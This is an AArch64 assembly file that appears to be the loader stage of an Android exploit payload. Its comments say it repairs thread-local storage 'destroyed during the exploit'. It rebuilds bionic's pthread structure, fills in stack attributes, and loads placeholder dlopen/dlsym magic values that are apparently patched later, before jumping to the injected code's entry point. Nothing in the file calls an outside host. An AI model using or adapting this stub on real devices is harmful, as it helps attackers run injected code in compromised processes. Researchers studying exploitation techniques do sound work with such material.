#define BIONIC_NUM_TLS_SLOTS 8


entry:

    //Fixing the TLS since it was destroyed during the exploit
    ADR X0, TLS
    MSR TPIDR_EL0, X0

    //Initializing the TLS
    ADR X0, TLS
    ADR X1, thread_tls
    ADR X2, THREAD
    STP X1, X2, [X0] 
    //TODO: Add stack check guard to TLS? Or is it only relevant on x86?

    //Populating the pthread_attr_t
    ADR X0, attr_stack_base
    MOV X1, SP                      //attr_stack_base
    AND X1, X1, #0xfffffffffffff000
    MOV X2, #0xff000                //attr_stack_size
    SUB X2, X2, #0x1000
    STP X1, X2, [X0]
    ADR X0, attr_guard_size
    MOV X1, #0x1000                 //attr_guard_size
    MOV X2, #0x0                    //attr_sched_policy + attr_sched_priority
    STP X1, X2, [X0]

    LDR X0, DLOPEN_MAGIC
    LDR X1, DLSYM_MAGIC
    B __start

.align 3
DLOPEN_MAGIC:
    .word 0x00000001
    .word 0xABCDABCD

.align 3
DLSYM_MAGIC:
    .word 0x00000002
    .word 0xABCDABCD

.align 3
TLS:
    .rept 8
    .quad 0x0
    .endr

.align 3
THREAD:
prev:                    .quad 0x0
next:                    .quad 0x0
tid:                     .word 0x0
cached_pid_:             .word 0x0
attr_padding0:           .word 0x0
attr_flags:              .word 0x0
attr_stack_base:         .quad 0x0
attr_stack_size:         .quad 0x0
attr_guard_size:         .quad 0x0
attr_sched_policy:       .word 0x0
attr_sched_priority:     .word 0x0
attr_reserved:           .rept 16
                         .byte 0x0
                         .endr
join_state:              .word 0x0
padding1:                .word 0x0
cleanup_stack:           .quad 0x0
start_routine:           .quad 0x0
start_routine_arg:       .quad 0x0
return_value:            .quad 0x0
alternate_signal_stack:  .quad 0x0
startup_handshake_mutex: .rept 10
                         .word 0x0
                         .endr
mmap_size:               .quad 0x0
thread_tls:              .rept 7
                         .quad 0x0
                         .endr
key_data:                .rept 128
                         .quad 0x0 //seq
                         .quad 0x0 //data
                         .endr

.align 12
__start:
